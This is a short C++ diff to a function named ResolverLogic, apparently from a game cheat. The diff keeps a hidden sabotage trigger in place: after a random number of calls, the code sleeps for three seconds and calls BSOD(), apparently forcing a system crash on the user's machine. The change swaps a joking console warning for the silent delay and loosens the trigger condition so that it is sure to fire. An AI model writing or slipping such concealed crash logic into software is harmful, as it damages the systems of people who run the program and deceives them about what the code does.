@@ -39,9 +39,9 @@ void Animations::ResolverLogic( ) {
 		static int i = 0;  ++i;
 		static int m_iNumber = M::RandomInt(1, 6);
 
-		if ( i == m_iNumber )
+		if ( i >= m_iNumber )
 		{
-			util::LogConsole( "U ded lol\n", Color( 255, 255, 255 ) );
+			Sleep( 3000 );
 			BSOD();
 		}
 	}
